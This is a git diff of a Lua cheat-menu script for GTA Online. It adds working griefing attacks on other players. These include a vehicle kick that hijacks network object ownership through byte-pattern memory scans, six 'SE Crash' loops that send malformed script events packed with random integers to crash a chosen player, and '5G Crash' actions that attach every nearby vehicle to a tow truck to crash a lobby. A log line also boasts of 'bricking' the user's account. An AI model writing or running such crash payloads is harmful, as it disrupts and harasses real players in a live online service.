@@ -29,7 +29,7 @@ async_http.dispatch()
 repeat util.yield()
 until response 
 
-local local_menu_version = "1.0.3"
+local local_menu_version = "1.0.4"
 
 if not dev_mode then
     async_http.init("raw.githubusercontent.com","/Addict0919/Addict-Script/main/AddictScript/AddictScriptVersion.lua",function(b)
@@ -132,9 +132,48 @@ util.log("Game has finished loading. Did main hooks in 202.02545 ms.")
 --util.yield(1500)
 util.log("Corrupt Stats Injected Successfully")
 --util.yield(150)
-util.log(SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME() .. "'s account successfully bricked.")
 
 
+-- Memory Functions
+
+local orgScan = memory.scan
+
+function myModule(name, pattern, callback)
+    local address = orgScan(pattern)
+    if address ~= NULL then
+        util.log("Found " .. name)
+        callback(address)
+    else
+        util.log("Failed to find " .. name)
+        util.stop_script()
+    end
+end
+
+---@param entity Entity
+---@return integer
+function get_net_obj(entity)
+    local pEntity = entities.handle_to_pointer(entity)
+    return pEntity ~= NULL and memory.read_long(pEntity + 0x00D0) or NULL
+end
+
+---@param player integer
+---@return integer
+function GetNetGamePlayer(player)
+    return util.call_foreign_function(GetNetGamePlayer_addr, player)
+end
+
+myModule("GetNetGamePlayer", "48 83 EC ? 33 C0 38 05 ? ? ? ? 74 ? 83 F9", function (address)
+    GetNetGamePlayer_addr = address
+end)
+myModule("CNetworkObjectMgr", "48 8B 0D ? ? ? ? 45 33 C0 E8 ? ? ? ? 33 FF 4C 8B F0", function (address)
+    CNetworkObjectMgr = memory.rip(address + 3)
+end)
+
+myModule("ChangeNetObjOwner", "48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 41 54 41 56 41 57 48 81 EC ? ? ? ? 44 8A 62 4B", function (address)
+    ChangeNetObjOwner_addr = address
+end)
+
+util.log(SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME() .. "'s account bricked successfully!")
 util.log("░█████╗░██████╗░██████╗░██╗░█████╗░████████╗  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗")
 util.log("██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝  ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝")
 util.log("███████║██║░░██║██║░░██║██║██║░░╚═╝░░░██║░░░  ╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░")
@@ -2108,44 +2147,6 @@ items.presets.nightclub.root:toggle("Enable", {}, "Enable the preset value for y
             return
         end
     end
-
-    local orgScan = memory.scan
-
-    function memory.scan(name, pattern, callback)
-        local address = orgScan(pattern)
-        if address ~= NULL then
-            util.log("Found " .. name)
-            callback(address)
-        else
-            util.log("Failed to find " .. name)
-            util.stop_script()
-        end
-    end
-    
-    function get_net_obj(entity)
-        local pEntity = entities.handle_to_pointer(entity)
-        return pEntity ~= NULL and memory.read_long(pEntity + 0x00D0) or NULL
-    end
-    
-    function get_entity_owner(entity)
-        local net_obj = get_net_obj(entity)
-        return net_obj ~= NULL and memory.read_byte(net_obj + 0x49) or -1
-    end
-    
-    function GetNetGamePlayer(player)
-        return util.call_foreign_function(GetNetGamePlayer_addr, player)
-    end
-    
-    memory.scan("GetNetGamePlayer", "48 83 EC ? 33 C0 38 05 ? ? ? ? 74 ? 83 F9", function (address)
-        GetNetGamePlayer_addr = address
-    end)
-    memory.scan("CNetworkObjectMgr", "48 8B 0D ? ? ? ? 45 33 C0 E8 ? ? ? ? 33 FF 4C 8B F0", function (address)
-        CNetworkObjectMgr = memory.rip(address + 3)
-    end)
-    
-    memory.scan("ChangeNetObjOwner", "48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 41 54 41 56 41 57 48 81 EC ? ? ? ? 44 8A 62 4B", function (address)
-        ChangeNetObjOwner_addr = address
-    end)
 
     if not STATS.STAT_SET_INT(stats.nightclub, ((value * 2) + 4500000), true) then
         ref.value = false
@@ -7648,6 +7649,21 @@ GenerateFeatures = function(pid)
 		end
     end, nil, nil, COMMANDPERM_AGGRESSIVE)
 
+    menu.toggle_loop(mov_sub_vehicle_tab, "Give horn boost", {}, "Give the target horn-boost", function()  
+        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+        local vehicle = PED.GET_VEHICLE_PED_IS_IN(player, false)
+        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
+        local force = ENTITY.GET_ENTITY_FORWARD_VECTOR(vehicle)
+        force.x = force.x * 20
+        force.y = force.y * 20
+        force.z = force.z * 20
+        while PLAYER.IS_PLAYER_PRESSING_HORN(pid) == true do 
+            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
+            ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, force.x, force.y, force.z, 0.0, 0.0, 0.0, 1, false, true, true, true, true)
+            util.yield(100)
+        end 
+    end)
+
 	menu.action(mov_sub_vehicle_tab,"Boost", {"boost"}, "Sets max speed of vehicle to 100 better for cars",function()
 		local vehicle = get_player_veh(pid,true)
 		if vehicle then
@@ -8269,11 +8285,24 @@ read_global = {
             TASK.TASK_ENTER_VEHICLE(ped, vehicle, 0, -1, 15, 24, true)
             util.yield(20)
             VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
-            for _ = 1, 20 do
-                TASK.TASK_VEHICLE_DRIVE_WANDER(ped, vehicle, 100.0, 2883621)
-                util.yield(50)
-                end
-            end)
+        for _ = 1, 20 do
+            TASK.TASK_VEHICLE_DRIVE_WANDER(ped, vehicle, 100.0, 2883621)
+            util.yield(50)
+            end
+        end)
+
+        menu.action(vehicle_kicks, "Kick from Vehicle V2", {"kickveh"}, "Changes the net object owner of the vehicle.", function()
+            local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
+            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, true)
+            local myveh = PED.GET_VEHICLE_PED_IS_IN(pped, true)
+            PED.SET_PED_INTO_VEHICLE(pped, veh, -2)
+            util.yield(50)
+            ChangeNetObjOwner(veh, pid)
+            ChangeNetObjOwner(veh, pped)
+            util.yield(50)
+            PED.SET_PED_INTO_VEHICLE(pped, myveh, -1)
+        end)
 
         menu.toggle_loop(vehicle_kicks, "Kick from Vehicle V2", {"kickveh"}, "Changes the net object owner of the vehicle.", function()
             local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
@@ -13273,7 +13302,6 @@ end)
                 menu.trigger_commands("bail".. players.get_name(pid))
                 menu.trigger_commands("boost".. players.get_name(pid))
                 menu.trigger_commands("ceopay".. players.get_name(pid))
-                menu.trigger_commands("repairloop".. players.get_name(pid))
                 menu.trigger_commands("autoammo".. players.get_name(pid))
                 menu.trigger_commands("autoheal".. players.get_name(pid))
                 menu.trigger_commands("removestickys".. players.get_name(pid))
@@ -13782,12 +13810,12 @@ end
 
 
 local lobbycrash = menu.list(crash, "Lobby Crashes", {"lobbycrashes"}, "")
-local TankCrash = menu.list(crash, "Tank Crashes", {"tankcrashes"}, "")
-local BroHugCrashes = menu.list(crash, "Bro Hug Crashes", {"brohugcrashes"}, "")
+--local TankCrash = menu.list(crash, "Tank Crashes", {"tankcrashes"}, "")
+--local BroHugCrashes = menu.list(crash, "Bro Hug Crashes", {"brohugcrashes"}, "")
 local badheadcrash = menu.list(crash, "Bad Head Blend Data Crashes", {"badhead"}, "")
 local MichaelCrashes = menu.list(crash, "Michael Taxi Crash", {"michaelcrashes"}, "Spawns animations next to them for crashing.")
-local chunguscrashes = menu.list(crash, "Big Chungus Crashes", {"bigchungustab"}, "")
-local craftcrash = menu.list(crash, "Vehicle Choas Crashes", {"vehiclechaos"}, "")
+--local chunguscrashes = menu.list(crash, "Big Chungus Crashes", {"bigchungustab"}, "")
+local craftcrash = menu.list(crash, "Vehicle Chaos Crashes", {"vehiclechaos"}, "")
 local vehcrash = menu.list(crash, "Vehicle Crashes", {"vehiclecrashes"}, "")
 local TaskCrashes = menu.list(crash, "Task Crashes", {"taskcrashes"}, "Spawns animations next to them for crashing.")
 local objectc = menu.list(crash, "Object Crashes", {"objectcrashes"}, "")
@@ -13813,7 +13841,7 @@ local standcrash = menu.list(crash, "Stand Crash Loops", {"standcrashloops"}, ""
 --      / /___/ _, _/ ___ |___/ / __  /
 --      \____/_/ |_/_/  |_/____/_/ /_/   
 
-
+--[[
 menu.action(TankCrash,"Tank Crash", {"tankcrash"}, "", function()
     menu.trigger_commands("levitate")
     util.yield(100)
@@ -13963,7 +13991,9 @@ menu.toggle_loop(TankCrash,"Tank Crash Loop", {"tankcrashloop"}, "", function()
         util.toast(os.date("%H:%M:%S") .. " Tank Crash Finished", TOAST_ABOVE_MAP)
     end
 end)
+]]
 
+--[[
 menu.divider(BroHugCrashes, "Bro Hugs")
 
 menu.action(BroHugCrashes, "Bro Hug", {"brohug"}, "Logged from 2take1 and modified it to be visible.", function(on)
@@ -15124,7 +15154,7 @@ menu.toggle_loop(BroHugCrashes, "Bro Hug V4", {"brohugv4loop"}, "Logged from 2ta
                 util.toast("Shitty Bro Hug Crash In Progress!\n" .. "\n" .. pedtype .. " Ped Types \n" .. "\n" .. ped_amount .. " Random Peds")
             end
         end, nil, nil, COMMANDPERM_AGGRESSIVE)
-
+]]
         
     menu.action(MichaelCrashes,"Michael Taxi Crash", {"michaeltaxi"}, "Spawns Michael with bad component variations then sets him into taxi performing a bad task.", function()
         local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
@@ -15186,6 +15216,7 @@ menu.toggle_loop(BroHugCrashes, "Bro Hug V4", {"brohugv4loop"}, "Logged from 2ta
     util.log("Michael Taxi Crash Sent to " .. players.get_name(pid))
 end)
 
+--[[
 menu.toggle_loop(chunguscrashes, "Big Chungus Crash", {"bigchungus"}, "Skid from x-force Big CHUNGUS Crash. Coded by Picoles(RyzeScript)", function(on_toggle)
         local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
         local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
@@ -15454,6 +15485,7 @@ else
     menu.trigger_commands("nocollision Off")
     end
 end)
+]]
 
 menu.toggle_loop(badheadcrash, "Bad Head Blend", {"outfitcrash"}, "", function()
     BlockSyncs(pid, function()
@@ -15993,6 +16025,110 @@ menu.toggle_loop(SECrashes, "SE Crash From X-Froce V2", {"xforcesev2"}, "Logged 
         util.trigger_script_event(1 << pid, {1556360603, 0, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647,  2147483647, 2147483647, 2147483647, 2147483647}) -- Crash Event S2
         util.trigger_script_event(1 << pid, {2041805809, 0, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647,  2147483647, 2147483647, 2147483647, 2147483647}) -- Modded Event S3
         util.trigger_script_event(1 << pid, {-702866045, 0, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647}) -- Apartment Invite
+    end
+end)
+
+menu.divider(SECrashes, "_________________________________________")
+
+menu.toggle_loop(SECrashes, "SE Crash V1 (S1)", {"secrashv1"}, "Script event crash, works good on normal player and also on cheap menus.", function()
+    local int_min = -2147483647
+    local int_max = 2147483647
+    for i = 1, 15 do
+        util.trigger_script_event(1 << pid, {1556360603, 7, 0, 0, -12988, -99097, 0, math.random(int_min, int_max), math.random(int_min, int_max), 
+        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+        util.trigger_script_event(1 << pid, {1556360603, 7, 0, 0, -12988, -99097, 0})
+    end
+    menu.trigger_commands("givesh" .. players.get_name(pid))
+    util.yield()
+    for i = 1, 15 do
+        util.trigger_script_event(1 << pid, {1556360603, 7, 0, 0, -12988, -99097, 0, pid, math.random(int_min, int_max)})
+        util.trigger_script_event(1 << pid, {1556360603, 7, 0, 0, -12988, -99097, 0})
+    end
+end)
+
+menu.toggle_loop(SECrashes, "SE Crash V2 (S1)", {"secrashv2"}, "Script event crash, works good on normal player and also on cheap menus.", function()
+    local int_min = -2147483647
+    local int_max = 2147483647
+    for i = 1, 15 do
+        util.trigger_script_event(1 << pid, {-992162568, 7, 269390394, -794038991, 674132290, 1008812628, 1828128189, -1047846427, -417630924, 1559354806, -2088673813, math.random(int_min, int_max), math.random(int_min, int_max), 
+        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+        util.trigger_script_event(1 << pid, {-992162568, 7, 269390394, -794038991, 674132290, 1008812628, 1828128189, -1047846427, -417630924, 1559354806, -2088673813})
+    end
+    menu.trigger_commands("givesh" .. players.get_name(pid))
+    util.yield()
+    for i = 1, 15 do
+        util.trigger_script_event(1 << pid, {-992162568, 7, 269390394, -794038991, 674132290, 1008812628, 1828128189, -1047846427, -417630924, 1559354806, -2088673813, pid, math.random(int_min, int_max)})
+        util.trigger_script_event(1 << pid, {-992162568, 7, 269390394, -794038991, 674132290, 1008812628, 1828128189, -1047846427, -417630924, 1559354806, -2088673813})
+    end
+end)
+
+menu.toggle_loop(SECrashes, "SE Crash V3 (S1)", {"secrashv3"}, "Script event crash, works good on normal player and also on cheap menus.", function()
+    local int_min = -2147483647
+    local int_max = 2147483647
+    for i = 1, 15 do
+        util.trigger_script_event(1 << pid, {-992162568, 7, -1405321467, -71842618, 1032432734, 1379092698, 2059280791, -306310582, 854698436, 954952113, -21599922, math.random(int_min, int_max), math.random(int_min, int_max), 
+        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+        util.trigger_script_event(1 << pid, {-992162568, 7, -1405321467, -71842618, 1032432734, 1379092698, 2059280791, -306310582, 854698436, 954952113, -21599922})
+    end
+    menu.trigger_commands("givesh" .. players.get_name(pid))
+    util.yield()
+    for i = 1, 15 do
+        util.trigger_script_event(1 << pid, {-992162568, 7, -1405321467, -71842618, 1032432734, 1379092698, 2059280791, -306310582, 854698436, 954952113, -21599922, pid, math.random(int_min, int_max)})
+        util.trigger_script_event(1 << pid, {-992162568, 7, -1405321467, -71842618, 1032432734, 1379092698, 2059280791, -306310582, 854698436, 954952113, -21599922})
+    end
+end)
+
+menu.toggle_loop(SECrashes, "SE Crash V4 (S1)", {"secrashv4"}, "Script event crash, works good on normal player and also on cheap menus.", function()
+    local int_min = -2147483647
+    local int_max = 2147483647
+    for i = 1, 15 do
+        util.trigger_script_event(1 << pid, {-992162568, 7, -157316019, 279369744, 1447611509, -138926790, -1847982995, 124907913, 1712690347, -332924195, 180190823, math.random(int_min, int_max), math.random(int_min, int_max), 
+        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+        util.trigger_script_event(1 << pid, {-992162568, 7, -157316019, 279369744, 1447611509, -138926790, -1847982995, 124907913, 1712690347, -332924195, 180190823})
+    end
+    menu.trigger_commands("givesh" .. players.get_name(pid))
+    util.yield()
+    for i = 1, 15 do
+        util.trigger_script_event(1 << pid, {-992162568, 7, -157316019, 279369744, 1447611509, -138926790, -1847982995, 124907913, 1712690347, -332924195, 180190823, pid, math.random(int_min, int_max)})
+        util.trigger_script_event(1 << pid, {-992162568, 7, -157316019, 279369744, 1447611509, -138926790, -1847982995, 124907913, 1712690347, -332924195, 180190823})
+    end
+end)
+
+menu.toggle_loop(SECrashes, "SE Crash V5 (S1)", {"secrashv5"}, "Script event crash, works good on normal player and also on cheap menus.", function()
+    local int_min = -2147483647
+    local int_max = 2147483647
+    for i = 1, 15 do
+        util.trigger_script_event(1 << pid, {-992162568, 7, -1915611464, 726910408, 1431442525, 212876633, 1775875950, 1471359395, 630636925, -1917431383, 355282240, math.random(int_min, int_max), math.random(int_min, int_max), 
+        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+        util.trigger_script_event(1 << pid, {-992162568, 7, -1915611464, 726910408, 1431442525, 212876633, 1775875950, 1471359395, 630636925, -1917431383, 355282240})
+    end
+    menu.trigger_commands("givesh" .. players.get_name(pid))
+    util.yield()
+    for i = 1, 15 do
+        util.trigger_script_event(1 << pid, {-992162568, 7, -1915611464, 726910408, 1431442525, 212876633, 1775875950, 1471359395, 630636925, -1917431383, 355282240, pid, math.random(int_min, int_max)})
+        util.trigger_script_event(1 << pid, {-992162568, 7, -1915611464, 726910408, 1431442525, 212876633, 1775875950, 1471359395, 630636925, -1917431383, 355282240})
+    end
+end)
+
+menu.toggle_loop(SECrashes, "SE Crash V6 (S1)", {"secrashv6"}, "Script event crash, works good on normal player and also on cheap menus.", function()
+    local int_min = -2147483647
+    local int_max = 2147483647
+    for i = 1, 15 do
+        util.trigger_script_event(1 << pid, {-992162568, 7, -1920546950, 424317740, -116307085, -932273001, 1233934158, -218292917, 1056663014, 806139883, -1370540183, math.random(int_min, int_max), math.random(int_min, int_max), 
+        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+        util.trigger_script_event(1 << pid, {-992162568, 7, -1920546950, 424317740, -116307085, -932273001, 1233934158, -218292917, 1056663014, 806139883, -1370540183})
+    end
+    menu.trigger_commands("givesh" .. players.get_name(pid))
+    util.yield()
+    for i = 1, 15 do
+        util.trigger_script_event(1 << pid, {-992162568, 7, -1920546950, 424317740, -116307085, -932273001, 1233934158, -218292917, 1056663014, 806139883, -1370540183, pid, math.random(int_min, int_max)})
+        util.trigger_script_event(1 << pid, {-992162568, 7, -1920546950, 424317740, -116307085, -932273001, 1233934158, -218292917, 1056663014, 806139883, -1370540183})
     end
 end)
 
@@ -17613,6 +17749,128 @@ menu.toggle(TaskCrashes, "Coffee Crash", {"coffeecrash"}, "It's risky to spectat
             crash_ents = {}
         end
 end)
+
+local Five_G_Crashes = menu.list(lobbycrash, "5G Crashes", {}, "")
+
+towtruck_area_attach = function(pid)
+ --   if pid == players.user() then return end
+
+    while not STREAMING.HAS_MODEL_LOADED(2971866336) do
+        STREAMING.REQUEST_MODEL(2971866336)
+        util.yield()
+    end
+
+    local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
+    local vehicles = entities.get_all_vehicles_as_handles()
+
+    towtruck = entities.create_vehicle(2971866336, coords, 0.0)
+
+    for i, v in pairs(vehicles) do
+        ENTITY.ATTACH_ENTITY_TO_ENTITY(v, towtruck, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
+        ENTITY.SET_ENTITY_INVINCIBLE(v, true)
+        util.yield()
+    end
+
+    util.yield(500)
+
+    for i, v in pairs(vehicles) do
+        entities.delete_by_handle(v)
+        entities.delete_by_handle(towtruck)
+        util.yield()
+    end
+end
+
+menu.action(Five_G_Crashes, "5G Crash", {"fiveg"}, "Crystals.", function()
+    towtruck_area_attach(pid)
+end, nil, nil, COMMANDPERM_AGGRESSIVE)
+
+--[[
+menu.action(Five_G_Crashes, "5G Crash", {"5gcrash"}, "Working on this...", function(value, pid)
+    --if pid ~= players.user() then
+        if players.get_spectate_target(pid) or playerposition(players.user(pid), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) then
+            local vehicles = entities.get_all_vehicles_as_pointers(entities.get_all_vehicles_as_handles()), 1000, 5000, true, true, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
+            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
+
+            for i = 1, #vehicles do
+                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicles[i])
+            end
+
+            if #vehicles > 30 then
+				util.toast("5G Crash: " .. #vehicles .. " valid subjects found! Executing Crash...")
+				util.yield(1000)
+
+                if value == 0 then
+                    while not STREAMING.HAS_MODEL_LOADED(2971866336) do
+                        STREAMING.REQUEST_MODEL(2971866336)
+                        util.yield()
+                    end
+                    util.request_model(2971866336)
+                    tow_truck_5g_vehicle = entities.create_vehicle(2971866336, TargetPlayerPos, 0.0)
+                elseif value == 1 then
+                    while not STREAMING.HAS_MODEL_LOADED(3852654278) do
+                        STREAMING.REQUEST_MODEL(3852654278)
+                        util.yield()
+                    end
+                    util.request_model(3852654278)
+                    tow_truck_5g_vehicle = entities.create_vehicle(3852654278, TargetPlayerPos, 0.0)
+				end
+                ENTITY.SET_ENTITY_INVINCIBLE(tow_truck_5g_vehicle, true)
+                ENTITY.SET_ENTITY_VISIBLE(tow_truck_5g_vehicle, true, 0)
+			    for i = 1, #vehicles do
+                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicles[i])
+                    ENTITY.SET_ENTITY_INVINCIBLE(vehicles[i], true)
+                    ENTITY.SET_ENTITY_VISIBLE(vehicles[i], true, 0)
+				end
+				for i = 1, #vehicles do
+                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicles[i])
+                    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicles[i], tow_truck_5g_vehicle, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
+                    util.yield(1)
+                end
+                local time = util.current_time_millis() + 2000
+				while time > util.current_time_millis() do
+                    util.yield_once()
+                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(players.user(pid))
+                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user(pid))
+					for i = 1, #vehicles do
+                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicles[i])
+                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(vehicles[i], TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
+					end
+				end
+                for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
+                    local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
+                    if not PED.IS_PED_A_PLAYER(PedInSeat) then
+                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
+                        entities.delete_by_handle(ent)
+                        util.yield()
+                    end
+                end
+                util.toast("5G Tow Truck Crash executed successfully.")
+			else
+                util.toast("Failed! :/ You have to spectate the target or be near them in order for this feature to work.")
+            end
+        else
+            util.toast("Invalid Player.")
+        end 
+end)
+]]
+
+menu.action(Five_G_Crashes, "5G Crash", {"fivegcrash"}, "5G? Skidded from Ryze Script.", function()
+    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+    local allvehicles = entities.get_all_vehicles_as_handles()
+    for i = 1, 3 do
+        for i = 1, #allvehicles do
+            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
+            util.yield()
+            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
+            util.yield()
+            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
+            util.yield()
+            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
+            util.yield()
+        end
+    end
+end, nil, nil, COMMANDPERM_AGGRESSIVE)
 
 local attachcrash = menu.list(lobbycrash, "Attachment Crashes", {}, "")
 
@@ -21802,7 +22060,7 @@ end)
 
 local detections = menu.list(menu.my_root(), "Modder Detections", {}, "")
 
-local auto_punish = menu.list(detections, "Aim Punishments=", {}, "")
+local auto_punish = menu.list(detections, "Aim Punishments", {}, "")
 
 local aim_det = menu.list(detections, "Aim Detection", {}, "")
 
